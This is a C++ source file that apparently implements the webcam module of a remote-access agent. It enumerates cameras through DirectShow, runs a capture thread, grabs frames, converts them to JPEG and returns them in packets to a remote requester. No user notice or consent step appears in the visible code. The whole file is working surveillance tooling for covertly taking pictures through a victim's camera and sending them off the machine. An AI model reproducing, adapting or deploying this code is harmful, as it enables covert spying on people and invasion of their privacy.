/*!
 * @file webcam.cpp
 * @brief Contains webcam interaction function definitions.
 * @todo Add a function which allows for the webcam snap functionality to be done in
 *       a single call instead of three separate calls resulting in a whole new thread
 *       being created and managed. The new function should reuse the thread if it exists
 *       but not bother with a new thread if it doesn't.
 * @remark This software is based on Touchless, which is released under MS-PL.
 */

#ifdef CINTERFACE
#undef CINTERFACE
#endif
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <dshow.h>
#pragma comment(lib, "strmiids")
extern "C" {
#include "../../common/common.h"
#include "webcam.h"
#include "bmp2jpeg.h"
}

//Required interface stuff - bad hack for qedit.h not being present/compatible with later windows versions
/*!
 * @brief Forward declaration of required \c ISampleGrabberCB interface.
 */
interface ISampleGrabberCB : public IUnknown
{
	virtual STDMETHODIMP SampleCB( double SampleTime, IMediaSample *pSample ) = 0;
	virtual STDMETHODIMP BufferCB( double SampleTime, BYTE *pBuffer, long BufferLen ) = 0;
};

static const IID IID_ISampleGrabberCB = { 0x0579154A, 0x2B53, 0x4994, { 0xB0, 0xD0, 0xE7, 0x73, 0x14, 0x8E, 0xFF, 0x85 } };

/*!
 * @brief Forward declaration of required \c ISampleGrabber interface.
 */
interface ISampleGrabber : public IUnknown
{
	virtual HRESULT STDMETHODCALLTYPE SetOneShot( BOOL OneShot ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetMediaType( const AM_MEDIA_TYPE *pType ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetConnectedMediaType( AM_MEDIA_TYPE *pType ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetBufferSamples( BOOL BufferThem ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetCurrentBuffer( long *pBufferSize, long *pBuffer ) = 0;
	virtual HRESULT STDMETHODCALLTYPE GetCurrentSample( IMediaSample **ppSample ) = 0;
	virtual HRESULT STDMETHODCALLTYPE SetCallback( ISampleGrabberCB *pCallback, long WhichMethodToCallback ) = 0;
};

static const IID IID_ISampleGrabber = { 0x6B652FFF, 0x11FE, 0x4fce, { 0x92, 0xAD, 0x02, 0x66, 0xB5, 0xD7, 0xC7, 0x8F } };
static const CLSID CLSID_SampleGrabber = { 0xC1F400A0, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };
static const CLSID CLSID_NullRenderer = { 0xC1F400A4, 0x3F08, 0x11d3, { 0x9F, 0x0B, 0x00, 0x60, 0x08, 0x03, 0x9E, 0x37 } };

/*! @brief Handle used for synchronisation with the main webcam grabber thread. */
HANDLE writeEvent;

/*! @brief Width of the captured frame. */
int nWidth;
/*! @brief Height of the captured frame. */
int nHeight;

/*! @brief Define a reasonable number of slots for cameras. */
#define MAX_CAMERAS		10

PBYTE imgdata = NULL;
long imgsize = 0;
UINT bmpsize = 0;
PBYTE bmpdata = NULL;
DWORD jpgsize = 0;
PBYTE jpgarray = NULL; //shouldn't be bigger, right?

/*! @brief SampleGrabber callback interface implementation. */
class MySampleGrabberCB : public ISampleGrabberCB
{
public:
	MySampleGrabberCB() {
		m_nRefCount = 0;
	}
	virtual HRESULT STDMETHODCALLTYPE SampleCB(
		double SampleTime,
		IMediaSample *pSample) {
		return E_FAIL;
	}
	virtual HRESULT STDMETHODCALLTYPE BufferCB(
		double SampleTime,
		BYTE *pBuffer,
		long BufferLen) {
		if (imgdata == NULL || imgsize < BufferLen) {
			imgsize = BufferLen;
			if (imgdata != NULL)
				free(imgdata);
			imgdata = (PBYTE)malloc(imgsize);
		}
		memcpy(imgdata, pBuffer, imgsize);
		SetEvent(writeEvent); //Notify of new frame
		return S_OK;
	}
	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		REFIID riid,
		void **ppvObject) {
		return E_FAIL;  // Not a very accurate implementation
	}
	virtual ULONG STDMETHODCALLTYPE AddRef() {
		return ++m_nRefCount;
	}
	virtual ULONG STDMETHODCALLTYPE Release() {
		int n = --m_nRefCount;
		if (n <= 0)
			delete this;
		return n;
	}
private:
	int m_nRefCount;
};

/*! @brief Valid actions that can be invoked on the webcam control thread. */
typedef enum
{
	StopCamera = 1,       ///< Tell the webcam control thread to terminate.
	GetCameraFrame = 2    ///< Tell the webcam control thread to capture a frame.
} WebcamAction;

/*! @brief State structure which is used for C&C of the webcam control thread. */
typedef struct _WebcamThreadState
{
	EVENT* pCallEvent;                             ///< Event used to make a call on the thread.
	EVENT* pResultEvent;                           ///< Event used to pause the thread.
	UINT index;                                    ///< Index of the camera to used.
	BOOL bRunning;                                 ///< Indicates if the control thread is running.
	DWORD dwResult;                                ///< Result of control thread processing.
	WebcamAction controlAction;                    ///< Action to perform on the control thread.
	UINT frameQuality;                             ///< Quality setting for frame capture.
	IGraphBuilder* pGraphBuilder;                  ///< COM-based graph builder.
	IMediaControl* pMediaControl;                  ///< COM-based media control.
	ICaptureGraphBuilder2* pCaptureGraphBuilder;   ///< COM-based graph capture pointer.
	IBaseFilter* pIBaseFilterCam;                  ///< COM-based camera filter.
	IBaseFilter* pIBaseFilterSampleGrabber;        ///< COM-based grabber.
	IBaseFilter* pIBaseFilterNullRenderer;         ///< COM-based NULL renderer.
	Packet* pResponse;                             ///< Response packet to write the result to.
} WebcamThreadState;

/*! @brief Reference to the thread state in use by the control thread. */
WebcamThreadState* g_pThreadState = NULL;

/*! @brief Reference to the control thread. */
THREAD* g_pWorkerThread = NULL;

/*!
 * @brief Start a webcam recording.
 * @param state Pointer to the \c WebcamThreadState which contains startup information.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Starting the webcam succeeded.
 */
DWORD webcam_start(WebcamThreadState* state)
{
	HRESULT hr;
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		IEnumMoniker* pclassEnum = NULL;
		ICreateDevEnum* pdevEnum = NULL;

		if (state->index < 1) {
			BREAK_WITH_ERROR("[WEBCAM] No webcams found", ERROR_FILE_NOT_FOUND);
		}

		CoInitialize(NULL);
		hr = CoCreateInstance(CLSID_SystemDeviceEnum,
			NULL,
			CLSCTX_INPROC,
			IID_ICreateDevEnum,
			(LPVOID*)&pdevEnum);

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] No webcams found", hr);
		}

		hr = pdevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pclassEnum, 0);

		if (pdevEnum != NULL){
			pdevEnum->Release();
			pdevEnum = NULL;
		}

		UINT nCount = 0;
		IUnknown* pUnk = NULL;
		if (pclassEnum == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] No webcams found", ERROR_FILE_NOT_FOUND);
		}

		IMoniker* apIMoniker[1];

		ULONG ulCount = 0;
		while (SUCCEEDED(hr) && nCount < state->index && pclassEnum->Next(1, apIMoniker, &ulCount) == S_OK) {
			pUnk = apIMoniker[0];
			nCount++;
		}

		pclassEnum->Release();
		if (pUnk == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] No webcams found", ERROR_FILE_NOT_FOUND);
		}

		IMoniker *pMoniker = NULL;

		// Grab the moniker interface
		hr = pUnk->QueryInterface(IID_IMoniker, (LPVOID*)&pMoniker);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Query interface failed", hr);
		}

		dprintf("[WEBCAM] Creating state->pGraphBuilder");

		// Build all the necessary interfaces to start the capture
		hr = CoCreateInstance(CLSID_FilterGraph,
			NULL,
			CLSCTX_INPROC,
			IID_IGraphBuilder,
			(LPVOID*)&state->pGraphBuilder);

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Filter graph creation failed", hr);
		}

		dprintf("[WEBCAM] Created state->pGraphBuilder (%p).", state->pGraphBuilder);

		hr = state->pGraphBuilder->QueryInterface(IID_IMediaControl, (LPVOID*)&state->pMediaControl);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Query interface failed", hr);
		}

		hr = CoCreateInstance(CLSID_CaptureGraphBuilder2,
			NULL,
			CLSCTX_INPROC,
			IID_ICaptureGraphBuilder2,
			(LPVOID*)&state->pCaptureGraphBuilder);

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Capture Graph Builder failed", hr);
		}

		// Setup the filter graph
		hr = state->pCaptureGraphBuilder->SetFiltergraph(state->pGraphBuilder);

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Set filter graph failed", hr);
		}

		// Build the camera from the moniker
		hr = pMoniker->BindToObject(NULL, NULL, IID_IBaseFilter, (LPVOID*)&state->pIBaseFilterCam);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Bind to object failed", hr);
		}

		// Add the camera to the filter graph
		hr = state->pGraphBuilder->AddFilter(state->pIBaseFilterCam, L"WebCam");
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Add filter failed", hr);
		}

		// Create a SampleGrabber
		hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterSampleGrabber);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Create sample grabber failed", hr);
		}

		// Configure the Sample Grabber
		ISampleGrabber *pGrabber = NULL;
		hr = state->pIBaseFilterSampleGrabber->QueryInterface(IID_ISampleGrabber, (void**)&pGrabber);
		if (SUCCEEDED(hr)) {
			AM_MEDIA_TYPE mt;
			ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
			mt.majortype = MEDIATYPE_Video;
			mt.subtype = MEDIASUBTYPE_RGB24;
			mt.formattype = FORMAT_VideoInfo;
			hr = pGrabber->SetMediaType(&mt);
		}

		if (SUCCEEDED(hr)) {
			MySampleGrabberCB* msg = new MySampleGrabberCB();
			hr = pGrabber->SetCallback(msg, 1);
		}

		if (pGrabber != NULL) {
			pGrabber->Release();
			pGrabber = NULL;
		}

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Sample grabber instantiation failed", hr);
		}

		// Add Sample Grabber to the filter graph
		hr = state->pGraphBuilder->AddFilter(state->pIBaseFilterSampleGrabber, L"SampleGrabber");
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Add Sample Grabber to the filter graph failed", hr);
		}

		// Create the NullRender
		hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&state->pIBaseFilterNullRenderer);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Create the NullRender failed", hr);
		}

		// Add the Null Render to the filter graph
		hr = state->pGraphBuilder->AddFilter(state->pIBaseFilterNullRenderer, L"NullRenderer");
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Add the Null Render to the filter graph failed", hr);
		}

		// Configure the render stream
		hr = state->pCaptureGraphBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, state->pIBaseFilterCam,
			state->pIBaseFilterSampleGrabber, state->pIBaseFilterNullRenderer);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Configure the render stream failed", hr);
		}

		// Grab the capture width and height
		hr = state->pIBaseFilterSampleGrabber->QueryInterface(IID_ISampleGrabber, (LPVOID*)&pGrabber);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Querying interface failed", hr);
		}

		AM_MEDIA_TYPE mt;
		hr = pGrabber->GetConnectedMediaType(&mt);
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] GetConnectedMediaType failed", hr);
		}

		VIDEOINFOHEADER *pVih;
		if ((mt.formattype == FORMAT_VideoInfo) &&
			(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
			(mt.pbFormat != NULL)) {
			pVih = (VIDEOINFOHEADER*)mt.pbFormat;
			nWidth = pVih->bmiHeader.biWidth;
			nHeight = pVih->bmiHeader.biHeight;
		}
		else {
			BREAK_WITH_ERROR("[WEBCAM] Wrong format type", hr);
		}

		if (pGrabber != NULL) {
			pGrabber->Release();
			pGrabber = NULL;
		}

		//Sync: set up semaphore
		writeEvent = CreateEvent(
			NULL,               // default security attributes
			FALSE,               // auto-reset event
			FALSE,              // initial state is nonsignaled
			NULL);  // no object name

		// Start the capture
		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] CreateEvent failed", hr);
		}
		hr = state->pMediaControl->Run();

		if (FAILED(hr)) {
			BREAK_WITH_ERROR("[WEBCAM] Running capture failed", hr);
		}

		// Cleanup
		if (pMoniker != NULL) {
			pMoniker->Release();
			pMoniker = NULL;
		}

		//Now we wait for first frame
		if (WaitForSingleObject(writeEvent, 30000) == WAIT_TIMEOUT) {
			BREAK_WITH_ERROR("[WEBCAM] timeout!", WAIT_TIMEOUT);
		}

		dwResult = GetLastError();
	} while (0);

	return dwResult;
}

/*!
 * @brief Grab a frame from the currently running camera.
 * @param state Pointer to the \c WebcamThreadState which contains capture/quality information.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Starting the webcam succeeded.
 * @remark The `frameQuality` member of `state` is assumed to be set.
 * @todo Convert this to GDI+ to avoid the jpg lib overhead.
 */
DWORD webcam_get_frame(WebcamThreadState* state)
{
	DWORD dwResult = ERROR_SUCCESS;
	UINT quality = state->frameQuality;

	dprintf("[WEBCAM] Entry.");

	do
	{
		//Make bmp
		BITMAPFILEHEADER	bfh;
		bfh.bfType = 0x4d42;	// always "BM"
		bfh.bfSize = sizeof(BITMAPFILEHEADER);
		bfh.bfReserved1 = 0;
		bfh.bfReserved2 = 0;
		bfh.bfOffBits = (DWORD)(sizeof(bfh) + sizeof(BITMAPINFOHEADER));

		BITMAPINFOHEADER bih;
		bih.biSize = sizeof(BITMAPINFOHEADER);
		bih.biWidth = nWidth;
		bih.biHeight = nHeight;
		bih.biPlanes = 1;
		bih.biBitCount = 24;
		bih.biCompression = BI_RGB;
		bih.biSizeImage = imgsize;
		bih.biXPelsPerMeter = 0;
		bih.biYPelsPerMeter = 0;
		bih.biClrUsed = 0;
		bih.biClrImportant = 0;

		UINT mybmpsize = imgsize + sizeof(bfh) + sizeof(bih);
		if (bmpsize < mybmpsize) {
			bmpsize = mybmpsize;
			if (bmpdata != NULL)
				delete[] bmpdata;
			bmpdata = new BYTE[bmpsize];
		}

		// put headers together to make a .bmp in memory
		memcpy(bmpdata, &bfh, sizeof(bfh));
		memcpy(bmpdata + sizeof(bfh), &bih, sizeof(bih));
		memcpy(bmpdata + sizeof(bfh) + sizeof(bih), imgdata, imgsize);

		// Now convert to JPEG
		// TODO: rip this out and use GDI+ down the track
		bmp2jpeg(bmpdata, quality, &jpgarray, &jpgsize);

		//And send
		packet_add_tlv_raw(state->pResponse, TLV_TYPE_WEBCAM_IMAGE, jpgarray, jpgsize);
	} while (0);

	PBYTE tmparray = jpgarray;
	jpgsize = 0;
	jpgarray = NULL;
	free(tmparray);

	dprintf("[WEBCAM] Exit.");

	return dwResult;
}

/*!
 * @brief Callback for the webcam control thread.
 * @param thread Pointer to the \c THREAD information block for the thread.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Operation completed as expected.
 * @remark This will run on a separate thread and manage the lifetime of the webcam and COM.
 */
DWORD THREADCALL webcam_control_thread(THREAD * thread)
{
	DWORD dwResult;
	WebcamThreadState* state = (WebcamThreadState*)thread->parameter1;

	dprintf("[WEBCAM] Entry.");
	state->bRunning = TRUE;
	CoInitialize(NULL);

	do
	{
		dwResult = webcam_start(state);

		if (dwResult != ERROR_SUCCESS)
			break;

		// let the caller know that we've initialised
		state->dwResult = dwResult;
		event_signal(state->pResultEvent);

		do
		{
			dprintf("[WEBCAM] Thread now running, waiting for a signal");

			// wait for the next call
			if (!event_poll(state->pCallEvent, -1)) {
				BREAK_WITH_ERROR("[WEBCAM] Failed to receive a signal from the caller", ERROR_TIMEOUT);
			}

			switch (state->controlAction)
			{
			case StopCamera:
				dprintf("[WEBCAM] StopCamera called.");
				dwResult = ERROR_SUCCESS;
				state->bRunning = FALSE;
				break;
			case GetCameraFrame:
				dprintf("[WEBCAM] GetCameraFrame called.");
				dwResult = webcam_get_frame(state);
				event_signal(state->pResultEvent);
				break;
			default:
				dprintf("[WEBCAM] Unexpected action %u", (DWORD)state->controlAction);
				state->bRunning = FALSE;
				dwResult = ERROR_UNKNOWN_FEATURE;
				break;
			}
		} while (state->bRunning);
	} while (0);

	if (state->pIBaseFilterNullRenderer != NULL) {
		dprintf("[WEBCAM] Releasing state->pIBaseFilterNullRenderer.");
		state->pIBaseFilterNullRenderer->Release();
		state->pIBaseFilterNullRenderer = NULL;
	}
	if (state->pIBaseFilterSampleGrabber != NULL) {
		dprintf("[WEBCAM] Releasing state->pIBaseFilterSampleGrabber.");
		state->pIBaseFilterSampleGrabber->Release();
		state->pIBaseFilterSampleGrabber = NULL;
	}
	if (state->pIBaseFilterCam != NULL) {
		dprintf("[WEBCAM] Releasing state->pIBaseFilterCam.");
		state->pIBaseFilterCam->Release();
		state->pIBaseFilterCam = NULL;
	}
	if (state->pCaptureGraphBuilder != NULL) {
		dprintf("[WEBCAM] Releasing state->pCaptureGraphBuilder.");
		state->pCaptureGraphBuilder->Release();
		state->pCaptureGraphBuilder = NULL;
	}
	if (state->pMediaControl != NULL) {
		dprintf("[WEBCAM] Stopping state->pMediaControl.");
		state->pMediaControl->Stop();
		state->pMediaControl->Release();
		state->pMediaControl = NULL;
	}
	if (state->pGraphBuilder != NULL) {
		dprintf("[WEBCAM] Releasing state->pGraphBuilder (%p).", state->pGraphBuilder);
		state->pGraphBuilder->Release();
		state->pGraphBuilder = NULL;
	}

	CoUninitialize();

	state->dwResult = dwResult;

	// signal that the thread is finishing
	event_signal(state->pResultEvent);

	dprintf("[WEBCAM] Exit.");

	return dwResult;
}

extern "C" {

/*!
 * @brief Handle the request for a list of available webcams.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Operation completed as expected.
 * @todo Make this use `packet_add_tlv_wstring` when it has been merged.
 */
DWORD request_webcam_list(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;

	do{
		IEnumMoniker* pclassEnum = NULL;
		ICreateDevEnum* pdevEnum = NULL;

		CoInitialize(NULL);
		HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,
			NULL,
			CLSCTX_INPROC,
			IID_ICreateDevEnum,
			(LPVOID*)&pdevEnum);

		if (SUCCEEDED(hr)) {
			hr = pdevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pclassEnum, 0);
		}

		if (pdevEnum != NULL) {
			pdevEnum->Release();
			pdevEnum = NULL;
		}

		int nCount = 0;
		if (pclassEnum == NULL) {
			break;// Error!
		}

		IMoniker* apIMoniker[1];
		ULONG ulCount = 0;
		while (SUCCEEDED(hr) && nCount < MAX_CAMERAS && pclassEnum->Next(1, apIMoniker, &ulCount) == S_OK) {
			IPropertyBag *pPropBag;
			hr = apIMoniker[0]->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pPropBag);

			if (SUCCEEDED(hr)) {
				// To retrieve the filter's friendly name, do the following:
				VARIANT varName;
				VariantInit(&varName);
				hr = pPropBag->Read(L"FriendlyName", &varName, 0);

				if (SUCCEEDED(hr) && varName.vt == VT_BSTR) {
					//TODO: make this use the new `packet_add_tlv_wstring` when it has been merged.
					//get chars from wchars
					size_t converted;
					char charbuf[512];
					wcstombs_s(&converted, charbuf, sizeof(charbuf), varName.bstrVal, sizeof(charbuf));
					packet_add_tlv_string(response, TLV_TYPE_WEBCAM_NAME, charbuf);
				}

				VariantClear(&varName);
				pPropBag->Release();

				nCount++;
			}
		}

		pclassEnum->Release();
	} while (0);

	dwResult = GetLastError();

	packet_transmit_response(dwResult, remote, response);

	CoUninitialize();
	return dwResult;
}

/*!
 * @brief Handle the request to start a given webcam.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Operation completed as expected.
 * @remark This will start a webcam controller thread. From there the
 *         lifetime of the webcam is managed.
 * @sa webcam_control_thread
 */
DWORD request_webcam_start(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;
	UINT index = packet_get_tlv_value_uint(packet, TLV_TYPE_WEBCAM_INTERFACE_ID);

	dprintf("[WEBCAM] Entry.");

	do
	{
		// If we have a thread running, then this means the webcam capture is already running too.
		if (g_pWorkerThread != NULL) {
			BREAK_WITH_ERROR("[WEBCAM] Already running!", ERROR_SERVICE_ALREADY_RUNNING);
		}

		g_pThreadState = (WebcamThreadState*)malloc(sizeof(WebcamThreadState));

		if (g_pThreadState == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] Out of memory", ERROR_OUTOFMEMORY);
		}

		ZeroMemory(g_pThreadState, sizeof(WebcamThreadState));

		// create a wait event and indicate we're expecting a response from the call
		g_pThreadState->pCallEvent = event_create();
		g_pThreadState->pResultEvent = event_create();
		g_pThreadState->index = index;

		// kick off the worker thread that will do all the cam handling on one thread to avoid
		// cross-threaded COM problems.
		g_pWorkerThread = thread_create(webcam_control_thread, g_pThreadState, NULL, NULL);

		if (g_pWorkerThread == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] Failed to create thread.", ERROR_THREAD_1_INACTIVE);
		}

		if (thread_run(g_pWorkerThread) == FALSE) {
			BREAK_WITH_ERROR("[WEBCAM] Failed to run worker thread", ERROR_CAN_NOT_COMPLETE);
		}

		// now wait for a signal to say that we've got things running
		if (event_poll(g_pThreadState->pResultEvent, 4000) == FALSE) {
			BREAK_WITH_ERROR("[WEBCAM] Failed to initialise worker thread", ERROR_WAIT_1);
		}

		dprintf("[WEBCAM] Webcam thread has been initialised");
		dwResult = g_pThreadState->dwResult;
	} while (0);

	packet_transmit_response(dwResult, remote, response);

	if (dwResult != ERROR_SUCCESS) {
		dprintf("[WEBCAM] Failure found, cleaning up");
		if (g_pWorkerThread != NULL) {
			if (g_pThreadState != NULL) {
				if (g_pThreadState->bRunning) {
					thread_kill(g_pWorkerThread);
				}

				thread_destroy(g_pWorkerThread);
				g_pWorkerThread = NULL;

				if (g_pThreadState->pCallEvent != NULL) {
					event_destroy(g_pThreadState->pCallEvent);
				}
				if (g_pThreadState->pResultEvent != NULL) {
					event_destroy(g_pThreadState->pResultEvent);
				}

				free(g_pThreadState);
				g_pThreadState = NULL;
			}
		}
	}

	dprintf("[WEBCAM] Exit.");

	return dwResult;
}

/*!
 * @brief Handle the request to grab a frame from the running webcam.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Operation completed as expected.
 * @remark This will interact with the control thread to grab a frame
 *         from the current running camera.
 * @sa webcam_control_thread
 */
DWORD request_webcam_get_frame(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	UINT quality = packet_get_tlv_value_uint(packet, TLV_TYPE_WEBCAM_QUALITY);
	DWORD dwResult = ERROR_SUCCESS;

	dprintf("[WEBCAM] Entry.");

	do
	{
		if (g_pWorkerThread == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] Webcam is not running", ERROR_NOT_READY);
		}

		// set up the thread call
		g_pThreadState->pResponse = response;
		g_pThreadState->frameQuality = quality;
		g_pThreadState->controlAction = GetCameraFrame;

		// invoke and wait
		event_signal(g_pThreadState->pCallEvent);

		if (event_poll(g_pThreadState->pResultEvent, 5000) == FALSE) {
			BREAK_WITH_ERROR("[WEBCAM] Failed to receive result in time", ERROR_WAIT_1);
		}

		// the handler thread should have added data to the packet to return to the caller, so off we go!
		dwResult = g_pThreadState->dwResult;
	} while (0);

	packet_transmit_response(dwResult, remote, response);

	dprintf("[WEBCAM] Exit.");
	return dwResult;
}

/*!
 * @brief Handle the request to stop the webcam.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 * @retval ERROR_SUCCESS Operation completed as expected.
 * @remark This will interact with the control thread and tell it
 *         to terminate after turning off the camera.
 * @sa webcam_control_thread
 */
DWORD request_webcam_stop(Remote *remote, Packet *packet) {
	Packet *response = packet_create_response(packet);
	DWORD dwResult = ERROR_SUCCESS;

	dprintf("[WEBCAM] Entry.");
	do
	{
		if (g_pWorkerThread == NULL) {
			BREAK_WITH_ERROR("[WEBCAM] Webcam is not running", ERROR_NOT_READY);
		}

		// set up the thread call
		g_pThreadState->controlAction = StopCamera;

		// invoke and wait
		event_signal(g_pThreadState->pCallEvent);

		if (event_poll(g_pThreadState->pResultEvent, 5000) == FALSE) {
			BREAK_WITH_ERROR("[WEBCAM] Failed to receive result in time", ERROR_WAIT_1);
		}

		// the handler thread should have added data to the packet to return to the caller, so off we go!
		dwResult = g_pThreadState->dwResult;
	} while (0);

	packet_transmit_response(dwResult, remote, response);

	event_destroy(g_pThreadState->pCallEvent);
	event_destroy(g_pThreadState->pResultEvent);
	free(g_pThreadState);
	g_pThreadState = NULL;

	thread_destroy(g_pWorkerThread);
	g_pWorkerThread = NULL;

	dprintf("[WEBCAM] Exit.");
	return dwResult;
}
}
